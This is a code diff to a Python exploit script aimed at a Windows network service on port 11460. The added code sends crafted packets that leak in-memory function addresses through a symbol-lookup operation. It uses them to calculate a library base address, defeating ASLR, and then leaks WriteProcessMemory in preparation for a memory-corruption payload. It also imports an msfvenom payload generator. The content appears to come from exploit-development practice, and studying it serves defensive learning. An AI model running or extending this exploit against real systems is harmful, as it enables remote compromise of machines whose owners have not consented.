@@ -185,35 +185,65 @@ from struct import pack
 from colorama import Fore, Style, init
 from modules.msfvenom_module import generatePayload
 from numpy import byte
+from rpyc import lib
 
 init()
 
-# Checksum
-buf = bytearray()  # Checksum DWORD        0x00 - 0x04
 
-# psAgentCommand
-buf += bytearray([0x41] * 0xC)  # psAgentCommand        0x04 - 0x34
-buf += pack("<i", 0x2000)  # Opcode                0x10
-buf += pack("<i", 0x0)  # 1st memcpy: offset    0x14
-buf += pack("<i", 0x100)  # 1st memcpy: size      0x18
-buf += pack("<i", 0x100)  # 2nd memcpy: offset    0x1C
-buf += pack("<i", 0x100)  # 2nd memcpy: size      0x20
-buf += pack("<i", 0x200)  # 3rd memcpy: offset    0x24
-buf += pack("<i", 0x100)  # 3rd memcpy: size      0x28
-buf += bytearray([0x41] * 0x8)  # N/A                   0x2C - 0x34
+def leakFunctionAddress(func, socketTup):
+    # Checksum
+    buf = bytearray()
 
+    # psAgentCommand
+    buf = func + b"A" * (0x100 - len(func))
+    buf += b"B" * 0x100
+    buf += b"C" * 0x100
 
-# psCommandBuffer
+    # Checksum
+    buf = pack(">i", len(buf) - 4) + buf
 
-symbol = b"SymbolOperationN98E_CRYPTO_get_new_lockid" + b"\x00"
-buf += symbol + b"A" * (0x100 - len(symbol))
-buf += b"B" * 0x100
-buf += b"C" * 0x100
+    timeout_seconds = 5
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(timeout_seconds)
+            s.connect(socketTup)
 
-# buffer = buf
+            print(Fore.CYAN + f"o Sending Buffer ({len(buf)} bytes): " + Style.RESET_ALL)
+            s.sendall(buf)
+            printBuffer(buf, width="dd")
+            print(f"{Fore.GREEN}o Buffer sent successfully!{Style.RESET_ALL}")
 
-# buf += b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (buffer, 0, 0, 0, 0)
-buf = pack(">i", len(buf) - 4) + buf  # Checksum DWORD        0x00 - 0x04
+            # Print out response from server
+            print(Fore.CYAN + f"o Waiting for response from server..." + Style.RESET_ALL)
+            response = b""
+            while True:
+                try:
+                    chunk = s.recv(1024)
+                    print(f"{Fore.YELLOW}Received chunk: {chunk}{Style.RESET_ALL}")
+                except socket.timeout:
+                    break
+                if not chunk:
+                    break
+                response += chunk
+                if b"Address is:" in response:
+                    break
+
+            if not response:
+                print(Fore.RED + "[-] No response received from server" + Style.RESET_ALL)
+                return 1
+
+            # Should have a valid response, parse it and get the address
+            functionAddress = parseResponse(response)
+            print(Fore.GREEN + f"o Found leaked address: 0x{functionAddress:08x}" + Style.RESET_ALL)
+
+            # Return the address only
+            return functionAddress
+    except socket.timeout:
+        print(Fore.RED + "[-] Socket operation timed out" + Style.RESET_ALL)
+        sys.exit(1)
+    except socket.error as error:
+        print(Fore.RED + f"[-] Socket error: {error}" + Style.RESET_ALL)
+        sys.exit(1)
 
 
 def printBuffer(buf, width="db"):
@@ -277,61 +307,31 @@ def main():
 
     server = sys.argv[1]
     port = 11460
-    timeout_seconds = 5
 
     print(Fore.CYAN + f"o IP Addr: {server}:{port}" + Style.RESET_ALL)
 
     try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(timeout_seconds)
-            s.connect((server, port))
 
-            print(Fore.CYAN + f"o Sending Buffer ({len(buf)} bytes): " + Style.RESET_ALL)
-            s.sendall(buf)
-            printBuffer(buf, width="dd")
-            print(f"{Fore.GREEN}o Buffer sent successfully!{Style.RESET_ALL}")
+        symbolOperation = leakFunctionAddress(b"N98E_CRYPTO_get_new_lockid" + b"\x00", (server, port))
 
-            # Print out response from server
-            print(Fore.CYAN + f"o Waiting for response from server..." + Style.RESET_ALL)
-            response = b""
-            while True:
-                try:
-                    chunk = s.recv(1024)
-                    print(f"{Fore.YELLOW}Received chunk: {chunk}{Style.RESET_ALL}")
-                except socket.timeout:
-                    break
-                if not chunk:
-                    break
-                response += chunk
-                if b"Address is:" in response:
-                    break
+        # Target Function Offset observed from loading the dll in IDA was noted
+        functionOffset = 0x14E0
 
-            if not response:
-                print(Fore.RED + "[-] No response received from server" + Style.RESET_ALL)
-                return 1
+        # Can use the in memory address and preferred function offset to get
+        # the base address of the library
+        if symbolOperation == 1:
+            print(Fore.RED + "[-] Failed to leak exportedFunction address" + Style.RESET_ALL)
+            return 1
+        libraryBase = symbolOperation - functionOffset
+        print(Fore.GREEN + f"o Calculated library base: {str(hex(libraryBase))}" + Style.RESET_ALL)
 
-            # Should have a valid response, parse it and get the address
-            functionAddress = parseResponse(response)
-            print(Fore.GREEN + f"o Found leaked address: 0x{functionAddress:08x}" + Style.RESET_ALL)
+        # Get Addr of WPM
+        WPMAddr = leakFunctionAddress(b"WriteProcessMemory" + b"\x00", (server, port))
+        print(Fore.GREEN + f"o Leaked WriteProcessMemory address: {hex(WPMAddr)}" + Style.RESET_ALL)
 
-            # Target Function Offset observed from loading the dll in IDA was noted
-            functionOffset = 0x14E0
-
-            # Can use the in memory address and preferred function offset to get the base address
-            # of the library
-            libraryBase = functionAddress - functionOffset
-            print(Fore.GREEN + f"o Calculated library base: {str(hex(libraryBase))}" + Style.RESET_ALL)
-
-            # 
-
-            return 0
-
-    except socket.timeout:
-        print(Fore.RED + "[-] Socket operation timed out" + Style.RESET_ALL)
-        return 1
-    except socket.error as error:
-        print(Fore.RED + f"[-] Socket error: {error}" + Style.RESET_ALL)
-        return 1
+        if WPMAddr == 1:
+            print(Fore.RED + "[-] Failed to leak WriteProcessMemory address" + Style.RESET_ALL)
+            return 1
 
     except KeyboardInterrupt:
         print(Fore.RED + "\n[!] User requested shutdown" + Style.RESET_ALL)
